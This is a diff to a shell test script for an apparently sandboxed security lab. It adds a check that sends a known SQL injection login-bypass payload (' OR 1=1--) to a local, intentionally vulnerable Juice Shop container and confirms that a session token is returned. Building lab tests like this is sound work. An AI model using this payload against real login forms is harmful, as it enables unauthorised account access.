@@ -21,6 +21,20 @@ assert_no_egress() {
   fi
 }
 
+assert_juice_shop_sqli() {
+  local payload response
+  payload='{"email":"'"'"' OR 1=1--","password":"security-studio-invalid-password"}'
+  response=$(curl --silent --show-error --max-time 8 \
+    -X POST "http://127.0.0.1:13000/rest/user/login" \
+    -H "Content-Type: application/json" --data "$payload")
+  if printf '%s' "$response" | python3 -c 'import json,sys; token=json.load(sys.stdin).get("authentication",{}).get("token"); sys.exit(0 if isinstance(token,str) and token else 1)'; then
+    echo "PASS: known SQLi payload produced a session in the intentionally vulnerable Juice Shop"
+  else
+    echo "FAIL: expected SQLi behavior was not observed in Juice Shop" >&2
+    return 1
+  fi
+}
+
 run_lab() {
   local mode="$1" host_port="$2" container_port="$3" path="$4"
   docker rm -f "$CONTAINER" >/dev/null 2>&1 || true
@@ -44,6 +58,7 @@ run_lab() {
   for attempt in $(seq 1 600); do
     if curl --silent --show-error --fail "http://127.0.0.1:$host_port$path" >/dev/null 2>&1; then
       echo "PASS: $mode answered HTTP on port $host_port"
+      if [ "$mode" = "juice-shop" ]; then assert_juice_shop_sqli; fi
       assert_no_egress "$mode"
       docker rm -f "$CONTAINER" >/dev/null
       return 0
